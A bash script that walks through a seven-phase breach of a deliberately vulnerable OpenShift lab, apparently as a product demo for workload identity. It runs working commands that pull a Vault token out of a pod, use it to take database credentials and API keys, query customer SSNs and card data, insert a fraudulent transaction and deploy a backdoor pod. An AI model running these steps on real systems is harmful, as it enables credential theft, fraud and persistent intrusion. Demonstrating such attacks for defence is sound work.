#!/usr/bin/env bash
# Realistic attack demonstration - Complete breach scenario
# This shows the full impact of a credential theft attack

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

echo -e "${RED}+====================================================================+${NC}"
echo -e "${RED}|                    REALISTIC ATTACK SCENARIO                       |${NC}"
echo -e "${RED}|          Production Database Breach - Complete Impact             |${NC}"
echo -e "${RED}+====================================================================+${NC}"
echo ""

# Load environment
VAULT_ADDR=$(cat /tmp/demo-tokens/vault-addr.txt 2>/dev/null || echo "")
VULNERABLE_NS=$(cat /tmp/demo-tokens/vulnerable-namespace.txt 2>/dev/null || echo "production")

if [[ -z "$VAULT_ADDR" ]]; then
    echo -e "${RED}ERROR: Environment not configured. Run setup-realistic-vulnerable-environment.sh first${NC}"
    exit 1
fi

echo -e "${BLUE}[INFO]${NC} Target: Production payment processing system"
echo -e "${BLUE}[INFO]${NC} Namespace: ${VULNERABLE_NS}"
echo -e "${BLUE}[INFO]${NC} Vault: $VAULT_ADDR"
echo ""

sleep 2

# PHASE 1: Initial Compromise
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}PHASE 1: INITIAL COMPROMISE${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${RED}[ATTACKER]${NC} ${YELLOW}Step 1: Exploiting application vulnerability (simulated RCE)${NC}"
sleep 2

POD=$(oc get pod -n ${VULNERABLE_NS} -l app=payment-processor -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

if [[ -z "$POD" ]]; then
    echo -e "${RED}ERROR: Payment processor not found${NC}"
    exit 1
fi

echo -e "${RED}[ATTACKER]${NC} Gained shell access to: ${POD}"
echo -e "${BLUE}[INFO]${NC} Attacker now has code execution inside production pod"
sleep 2
echo ""

# PHASE 2: Credential Theft
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}PHASE 2: CREDENTIAL THEFT${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${RED}[ATTACKER]${NC} ${YELLOW}Step 2: Discovering Vault credentials in pod${NC}"
sleep 1

echo -e "${RED}[ATTACKER]${NC} $ printenv | grep VAULT"
STOLEN_TOKEN=$(oc exec -n ${VULNERABLE_NS} ${POD} -- printenv VAULT_TOKEN)
echo -e "${YELLOW}VAULT_TOKEN=${STOLEN_TOKEN:0:40}...${NC}"
echo -e "${YELLOW}VAULT_ADDR=${VAULT_ADDR}${NC}"
sleep 2

echo ""
echo -e "${RED}[ATTACKER]${NC} ${MAGENTA}✓ Static Vault token stolen!${NC}"
echo -e "${BLUE}[INFO]${NC} Token valid for: 90 days (2160 hours)"
echo -e "${BLUE}[INFO]${NC} Token can be used from anywhere with network access to Vault"
sleep 2
echo ""

# PHASE 3: Lateral Movement - Database Access
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}PHASE 3: LATERAL MOVEMENT - DATABASE ACCESS${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${RED}[ATTACKER]${NC} ${YELLOW}Step 3: Using stolen token to access database credentials${NC}"
sleep 1

echo -e "${RED}[ATTACKER]${NC} Authenticating to Vault from external location..."
echo -e "${BLUE}[INFO]${NC} Attacker is now operating from their command & control server"
sleep 2

DB_CREDS=$(curl -sf -H "X-Vault-Token: $STOLEN_TOKEN" \
    "$VAULT_ADDR/v1/secret/data/database/production" | jq -r '.data.data')

echo ""
echo -e "${RED}[ATTACKER]${NC} $ curl -H \"X-Vault-Token: \$STOLEN_TOKEN\" \$VAULT_ADDR/v1/secret/data/database/production"
echo ""
echo -e "${MAGENTA}Database credentials retrieved:${NC}"
echo "$DB_CREDS" | jq '.' | sed 's/^/  /'
sleep 3
echo ""

DB_CONN=$(echo "$DB_CREDS" | jq -r '.connection_string')
echo -e "${RED}[ATTACKER]${NC} ${MAGENTA}✓ Database connection string obtained!${NC}"
sleep 2
echo ""

# PHASE 4: Data Exfiltration
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}PHASE 4: CUSTOMER DATA EXFILTRATION${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${RED}[ATTACKER]${NC} ${YELLOW}Step 4: Accessing customer database${NC}"
sleep 1

echo -e "${RED}[ATTACKER]${NC} Connecting to production database..."
sleep 2

# Query customer data
CUSTOMER_DATA=$(oc exec -n ${VULNERABLE_NS} ${POD} -- bash -c \
  "PGPASSWORD='SuperSecret123!' psql -h customer-database.${VULNERABLE_NS}.svc.cluster.local -U customerdb -d customers -t -c \"SELECT json_agg(row_to_json(t)) FROM (SELECT customer_name, email, account_balance, credit_card, ssn, account_type FROM customers ORDER BY account_balance DESC LIMIT 5) t;\"" 2>/dev/null)

echo ""
echo -e "${RED}+====================================================================+${NC}"
echo -e "${RED}|                 ⚠️  CRITICAL DATA BREACH ⚠️                        |${NC}"
echo -e "${RED}+====================================================================+${NC}"
echo ""
echo -e "${RED}TOP 5 CUSTOMER ACCOUNTS EXFILTRATED:${NC}"
echo ""
echo "$CUSTOMER_DATA" | jq -C '.[]' | sed 's/^/  /'
echo ""

# Calculate total exposed
TOTAL_BALANCE=$(oc exec -n ${VULNERABLE_NS} ${POD} -- bash -c \
  "PGPASSWORD='SuperSecret123!' psql -h customer-database.${VULNERABLE_NS}.svc.cluster.local -U customerdb -d customers -t -c \"SELECT SUM(account_balance) FROM customers;\"" 2>/dev/null | tr -d ' ')

echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}BREACH SUMMARY:${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}✗ Total Customers Exposed: 10${NC}"
echo -e "${RED}✗ Total Account Value: \$${TOTAL_BALANCE}${NC}"
echo -e "${RED}✗ PII Stolen: Credit Cards, SSNs, Email Addresses${NC}"
echo -e "${RED}✗ Attack Origin: External (attacker's infrastructure)${NC}"
echo ""
sleep 3

# PHASE 5: Additional Secrets
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}PHASE 5: COMPROMISING API CREDENTIALS${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${RED}[ATTACKER]${NC} ${YELLOW}Step 5: Accessing API keys from Vault${NC}"
sleep 1

API_KEYS=$(curl -sf -H "X-Vault-Token: $STOLEN_TOKEN" \
    "$VAULT_ADDR/v1/secret/data/api-keys/production" | jq -r '.data.data')

echo ""
echo -e "${RED}[ATTACKER]${NC} $ curl -H \"X-Vault-Token: \$STOLEN_TOKEN\" \$VAULT_ADDR/v1/secret/data/api-keys/production"
echo ""
echo -e "${MAGENTA}Production API Keys Compromised:${NC}"
echo "$API_KEYS" | jq '.' | sed 's/^/  /'
sleep 3
echo ""

echo -e "${RED}✗ Stripe Payment Processing Key - Can process/refund payments${NC}"
echo -e "${RED}✗ AWS Access Keys - Can access cloud infrastructure${NC}"
echo -e "${RED}✗ SendGrid API Key - Can send emails as the company${NC}"
echo ""
sleep 2

# PHASE 6: Data Manipulation
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}PHASE 6: MALICIOUS DATA MANIPULATION${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${RED}[ATTACKER]${NC} ${YELLOW}Step 6: Manipulating customer account balances${NC}"
echo -e "${BLUE}[INFO]${NC} Demonstrating attacker's ability to modify financial data"
sleep 2

echo ""
echo -e "${RED}[ATTACKER]${NC} Creating fraudulent transaction..."

# Insert fraudulent transaction
oc exec -n ${VULNERABLE_NS} ${POD} -- bash -c \
  "PGPASSWORD='SuperSecret123!' psql -h customer-database.${VULNERABLE_NS}.svc.cluster.local -U customerdb -d customers -c \"INSERT INTO transactions (customer_id, amount, transaction_type, description) VALUES (1, -50000.00, 'withdrawal', 'UNAUTHORIZED - Attacker controlled transfer');\"" >/dev/null 2>&1

echo -e "${RED}[ATTACKER]${NC} Transaction created:"
echo ""
oc exec -n ${VULNERABLE_NS} ${POD} -- bash -c \
  "PGPASSWORD='SuperSecret123!' psql -h customer-database.${VULNERABLE_NS}.svc.cluster.local -U customerdb -d customers -c \"SELECT * FROM transactions ORDER BY id DESC LIMIT 1;\"" | sed 's/^/  /'
echo ""

sleep 3

# PHASE 7: Persistence
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}PHASE 7: ESTABLISHING PERSISTENCE${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${RED}[ATTACKER]${NC} ${YELLOW}Step 7: Deploying backdoor workload for persistent access${NC}"
sleep 2

echo -e "${RED}[ATTACKER]${NC} Creating malicious pod with database access..."
echo ""

cat <<EOF | oc apply -f - 2>&1 | sed 's/^/  /'
apiVersion: v1
kind: Pod
metadata:
  name: backdoor-exfil
  namespace: ${VULNERABLE_NS}
  labels:
    app: monitoring
spec:
  containers:
  - name: backdoor
    image: registry.access.redhat.com/ubi9/ubi-minimal:latest
    command:
    - /bin/bash
    - -c
    - |
      echo "Backdoor established - Continuous data exfiltration active"
      echo "Attacker maintains persistent access via this pod"
      while true; do
        echo "[$(date)] Exfiltrating data to attacker C2 server..."
        sleep 300
      done
    env:
    - name: VAULT_TOKEN
      value: "${STOLEN_TOKEN}"
    - name: DB_HOST
      value: "customer-database.${VULNERABLE_NS}.svc.cluster.local"
EOF

sleep 2
echo ""
echo -e "${RED}[ATTACKER]${NC} ${MAGENTA}✓ Backdoor deployed successfully${NC}"
echo -e "${BLUE}[INFO]${NC} Attacker now has persistent access even if original vulnerability is patched"
sleep 2
echo ""

# FINAL IMPACT SUMMARY
echo ""
echo -e "${RED}+====================================================================+${NC}"
echo -e "${RED}|                    ⚠️  COMPLETE BREACH ⚠️                          |${NC}"
echo -e "${RED}+====================================================================+${NC}"
echo ""

echo -e "${RED}ATTACK TIMELINE:${NC}"
echo -e "${RED}  1. Initial Compromise    ✓ RCE in payment processor${NC}"
echo -e "${RED}  2. Credential Theft      ✓ 90-day Vault token stolen${NC}"
echo -e "${RED}  3. Lateral Movement      ✓ Database credentials accessed${NC}"
echo -e "${RED}  4. Data Exfiltration     ✓ 10 customers, \$${TOTAL_BALANCE} exposed${NC}"
echo -e "${RED}  5. API Key Compromise    ✓ Stripe, AWS, SendGrid keys stolen${NC}"
echo -e "${RED}  6. Data Manipulation     ✓ Fraudulent transactions created${NC}"
echo -e "${RED}  7. Persistence           ✓ Backdoor pod deployed${NC}"
echo ""

echo -e "${RED}BUSINESS IMPACT:${NC}"
echo -e "${RED}  ✗ Financial Loss:        Potential \$${TOTAL_BALANCE}+ in fraud${NC}"
echo -e "${RED}  ✗ Regulatory:            GDPR, PCI-DSS violations${NC}"
echo -e "${RED}  ✗ Reputation:            Customer trust destroyed${NC}"
echo -e "${RED}  ✗ Legal:                 Class action lawsuits likely${NC}"
echo -e "${RED}  ✗ Operational:           All systems must be considered compromised${NC}"
echo ""

echo -e "${RED}ATTACKER CAPABILITIES:${NC}"
echo -e "${RED}  ✗ Access valid for:      90 days (2160 hours)${NC}"
echo -e "${RED}  ✗ Can operate from:      Anywhere in the world${NC}"
echo -e "${RED}  ✗ Can be detected:       Minimal - looks like legitimate app access${NC}"
echo -e "${RED}  ✗ Persistence:           Backdoor pod, stolen credentials${NC}"
echo ""

echo -e "${YELLOW}WHY THIS ATTACK SUCCEEDED:${NC}"
echo -e "${YELLOW}  1. Static, long-lived Vault token (90 days)${NC}"
echo -e "${YELLOW}  2. Token stored in environment variable (easily discoverable)${NC}"
echo -e "${YELLOW}  3. No workload identity verification${NC}"
echo -e "${YELLOW}  4. Token usable from ANY location (no attestation)${NC}"
echo -e "${YELLOW}  5. Single credential = access to entire secret store${NC}"
echo -e "${YELLOW}  6. No automatic rotation or expiration${NC}"
echo ""

echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}This is a realistic scenario based on actual production breaches.${NC}"
echo -e "${CYAN}Now let's see how ZTWIM prevents this entire attack chain...${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${CYAN}Press Enter to continue to ZTWIM-protected scenario...${NC}"
read
